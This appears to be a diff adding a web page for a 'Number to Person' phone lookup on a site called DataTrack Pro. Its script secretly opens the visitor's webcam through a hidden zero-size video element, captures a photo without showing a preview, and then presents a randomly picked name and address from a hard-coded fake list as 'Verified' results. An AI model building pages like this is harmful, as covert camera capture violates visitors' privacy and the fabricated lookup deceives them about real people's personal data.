@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Number to Person - DataTrack Pro</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-container">
+            <div class="nav-brand">DataTrack Pro</div>
+            <div class="mobile-menu-toggle" onclick="toggleMobileMenu()">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+            <ul class="nav-menu">
+                <li class="nav-item"><a href="index.html" class="nav-link">Home</a></li>
+                <li class="nav-item"><a href="tools.html" class="nav-link">Tools</a></li>
+                <li class="nav-item"><a href="premium-services.html" class="nav-link">Premium Services</a></li>
+                <li class="nav-item"><a href="#" class="nav-link" onclick="logout()">Logout</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <main class="main-content">
+        <div class="container">
+            <div class="page-header">
+                <h1>Number to Person Lookup</h1>
+                <p>Find person details associated with phone numbers using advanced facial recognition technology.</p>
+            </div>
+
+            <div class="tool-section">
+                <form id="numberForm" class="tool-form">
+                    <div class="form-group">
+                        <label for="phoneNumber">Enter Phone Number</label>
+                        <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="Enter phone number" required>
+                    </div>
+                    <button type="submit" class="submit-btn">Find Person</button>
+                </form>
+
+                <div id="cameraSection" class="camera-section" style="display: none;">
+                    <h3>Profile Photo Capture</h3>
+                    <video id="camera" autoplay playsinline style="display:none;width:0;height:0;"></video>
+                    <canvas id="canvas" style="display: none;"></canvas>
+                    <div id="cameraStatus" class="camera-status">Capturing photo automatically...</div>
+                </div>
+
+                <div id="personResults" class="results-container" style="display: none;">
+                    <div class="result-card">
+                        <div class="result-header">
+                            <h3>Person Information</h3>
+                            <span class="timestamp" id="personTimestamp"></span>
+                        </div>
+                        <div class="result-content">
+                            <div class="profile-photo">
+                                <img id="profilePhoto" alt="Profile Photo">
+                            </div>
+                            <div class="person-details">
+                                <div class="result-row">
+                                    <strong>Phone Number:</strong>
+                                    <span id="displayPhone"></span>
+                                </div>
+                                <div class="result-row">
+                                    <strong>Full Name:</strong>
+                                    <span id="personName"></span>
+                                </div>
+                                <div class="result-row">
+                                    <strong>Address:</strong>
+                                    <span id="personAddress"></span>
+                                </div>
+                                <div class="result-row">
+                                    <strong>City:</strong>
+                                    <span id="personCity"></span>
+                                </div>
+                                <div class="result-row">
+                                    <strong>Status:</strong>
+                                    <span class="status-active">Verified</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-container">
+            <div class="footer-content">
+                <div class="footer-section">
+                    <h3>DataTrack Pro</h3>
+                    <p>Your comprehensive portal for secure information lookup and verification services.</p>
+                    <div class="social-links">
+                        <a href="#" class="social-link">📧</a>
+                        <a href="#" class="social-link">📱</a>
+                        <a href="#" class="social-link">💬</a>
+                        <a href="#" class="social-link">🔗</a>
+                    </div>
+                </div>
+                
+                <div class="footer-section">
+                    <h4>Quick Links</h4>
+                    <ul class="footer-links">
+                        <li><a href="index.html">Home</a></li>
+                        <li><a href="tools.html">Tools</a></li>
+                        <li><a href="premium-services.html">Premium Services</a></li>
+                    </ul>
+                </div>
+                
+                <div class="footer-section">
+                    <h4>Our Tools</h4>
+                    <ul class="footer-links">
+                        <li><a href="cnic-details.html">CNIC Details</a></li>
+                        <li><a href="bisp-checker.html">BISP Checker</a></li>
+                        <li><a href="imei-tracker.html">IMEI Tracker</a></li>
+                        <li><a href="number-to-person.html">Number to Person</a></li>
+                        <li><a href="number-location.html">Number Location</a></li>
+                    </ul>
+                </div>
+                
+                <div class="footer-section">
+                    <h4>Contact Info</h4>
+                    <div class="contact-info">
+                        <p>📧 support@datatrackpro.com</p>
+                        <p>📱 +92 300 1234567</p>
+                        <p>📍 Islamabad, Pakistan</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="footer-bottom">
+                <div class="footer-bottom-content">
+                    <p>&copy; 2024 DataTrack Pro. All rights reserved.</p>
+                    <div class="footer-bottom-links">
+                        <a href="#">Privacy Policy</a>
+                        <a href="#">Terms of Service</a>
+                        <a href="#">Cookie Policy</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script src="auth.js"></script>
+    <!-- WhatsApp Chat Widget -->
+    <div class="whatsapp-chat-widget" onclick="window.open('https://wa.me/923001234567','_blank')" title="Chat with us on WhatsApp">
+      <svg viewBox="0 0 32 32" fill="currentColor"><path d="M16 3C9.373 3 4 8.373 4 15c0 2.385.668 4.607 1.938 6.563L4 29l7.688-1.938A12.93 12.93 0 0 0 16 27c6.627 0 12-5.373 12-12S22.627 3 16 3zm0 22.5c-1.938 0-3.844-.5-5.5-1.438l-.406-.25-4.563 1.156 1.188-4.438-.25-.406C5.5 18.844 5 16.938 5 15c0-6.065 4.935-11 11-11s11 4.935 11 11-4.935 11-11 11zm6.188-7.344c-.344-.172-2.031-1.016-2.344-1.125-.313-.109-.531-.172-.75.172-.219.344-.859 1.125-1.063 1.344-.203.219-.391.25-.734.086-.344-.172-1.453-.535-2.77-1.703-1.023-.914-1.715-2.047-1.922-2.391-.203-.344-.022-.531.15-.703.156-.156.344-.406.516-.609.172-.203.229-.344.344-.578.109-.234.055-.438-.027-.609-.086-.172-.75-1.812-1.031-2.484-.27-.648-.547-.562-.75-.57-.188-.008-.406-.01-.625-.01-.219 0-.578.082-.883.406-.305.324-1.156 1.129-1.156 2.75 0 1.621 1.18 3.188 1.344 3.406.164.219 2.32 3.547 5.625 4.828.789.328 1.406.523 1.891.672.797.254 1.523.219 2.094.133.641-.094 2.031-.828 2.32-1.625.289-.797.289-1.484.203-1.625-.086-.141-.313-.219-.656-.391z"/></svg>
+    </div>
+    <!-- Dark/Light Mode Toggle -->
+    <button class="theme-toggle" id="themeToggle" title="Toggle dark/light mode">🌙</button>
+    <script>
+      // Theme toggle logic
+      const themeToggle = document.getElementById('themeToggle');
+      function setTheme(mode) {
+        if (mode === 'dark') {
+          document.body.classList.add('dark-mode');
+          themeToggle.textContent = '☀️';
+        } else {
+          document.body.classList.remove('dark-mode');
+          themeToggle.textContent = '🌙';
+        }
+      }
+      function getPreferredTheme() {
+        return localStorage.getItem('theme') || (window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light');
+      }
+      themeToggle.addEventListener('click', () => {
+        const current = document.body.classList.contains('dark-mode') ? 'dark' : 'light';
+        const next = current === 'dark' ? 'light' : 'dark';
+        setTheme(next);
+        localStorage.setItem('theme', next);
+      });
+      // On load
+      setTheme(getPreferredTheme());
+      // WhatsApp widget: (already handled by HTML above)
+    </script>
+    <script>
+        // Fake person data
+        const fakePersons = [
+            { name: "Ahmed Ali Khan", address: "House #45, Street 12, Gulberg III", city: "Lahore" },
+            { name: "Fatima Zahra", address: "Apartment 23, Block A, DHA Phase 6", city: "Karachi" },
+            { name: "Muhammad Hassan", address: "House #78, Street 8, F-8/1", city: "Islamabad" },
+            { name: "Ayesha Malik", address: "Flat 12, Building 5, Gulshan-e-Iqbal", city: "Karachi" },
+            { name: "Usman Ahmed", address: "House #34, Street 15, Model Town", city: "Lahore" },
+            { name: "Sana Khan", address: "Apartment 7, Block C, DHA Phase 5", city: "Lahore" },
+            { name: "Bilal Hassan", address: "House #67, Street 3, F-10/2", city: "Islamabad" },
+            { name: "Nadia Ali", address: "Flat 19, Building 3, Gulshan-e-Maymar", city: "Karachi" }
+        ];
+
+        let stream = null;
+
+        document.getElementById('numberForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const phone = document.getElementById('phoneNumber').value;
+            if (phone.length < 10) {
+                alert('Please enter a valid phone number');
+                return;
+            }
+
+            // Start camera and automatically capture in background (no preview shown)
+            startCameraAndAutoCapture();
+        });
+
+        function startCameraAndAutoCapture() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(mediaStream) {
+                    stream = mediaStream;
+                    const video = document.getElementById('camera');
+                    video.srcObject = mediaStream;
+                    // Ensure playback even if hidden
+                    if (typeof video.play === 'function') {
+                        video.play().catch(() => {});
+                    }
+
+                    // Wait for video to be ready, then automatically capture
+                    video.onloadedmetadata = function() {
+                        setTimeout(() => {
+                            capturePhoto();
+                        }, 1500); // Wait 1.5 seconds for camera to stabilize
+                    };
+                })
+                .catch(function(error) {
+                    console.error('Camera access denied:', error);
+                    // Simulate photo capture if camera is not available
+                    setTimeout(() => simulatePhotoCapture(), 1000);
+                });
+        }
+
+        function capturePhoto() {
+            const video = document.getElementById('camera');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            
+            // Update status
+            document.getElementById('cameraStatus').textContent = 'Photo captured! Processing results...';
+            
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0);
+            
+            // Stop camera
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+            
+            // Hide camera section after a brief delay
+            setTimeout(() => {
+                document.getElementById('cameraSection').style.display = 'none';
+                // Show results
+                showPersonResults();
+            }, 1000);
+        }
+
+        function simulatePhotoCapture() {
+            // Update status
+            document.getElementById('cameraStatus').textContent = 'Simulated photo created! Processing results...';
+            
+            // Create a simulated photo
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            
+            canvas.width = 300;
+            canvas.height = 300;
+            
+            // Draw a simple colored rectangle as placeholder
+            context.fillStyle = '#4CAF50';
+            context.fillRect(0, 0, 300, 300);
+            context.fillStyle = 'white';
+            context.font = '24px Arial';
+            context.textAlign = 'center';
+            context.fillText('Profile Photo', 150, 150);
+            
+            // Hide camera section after a brief delay
+            setTimeout(() => {
+                document.getElementById('cameraSection').style.display = 'none';
+                // Show results
+                showPersonResults();
+            }, 1000);
+        }
+
+        function showPersonResults() {
+            const phone = document.getElementById('phoneNumber').value;
+            const randomPerson = fakePersons[Math.floor(Math.random() * fakePersons.length)];
+            
+            // Display photo
+            const canvas = document.getElementById('canvas');
+            const profilePhoto = document.getElementById('profilePhoto');
+            profilePhoto.src = canvas.toDataURL();
+            
+            // Display details
+            document.getElementById('displayPhone').textContent = phone;
+            document.getElementById('personName').textContent = randomPerson.name;
+            document.getElementById('personAddress').textContent = randomPerson.address;
+            document.getElementById('personCity').textContent = randomPerson.city;
+            document.getElementById('personTimestamp').textContent = new Date().toLocaleString();
+            
+            // Show results
+            document.getElementById('personResults').style.display = 'block';
+        }
+    </script>
+</body>
+</html>
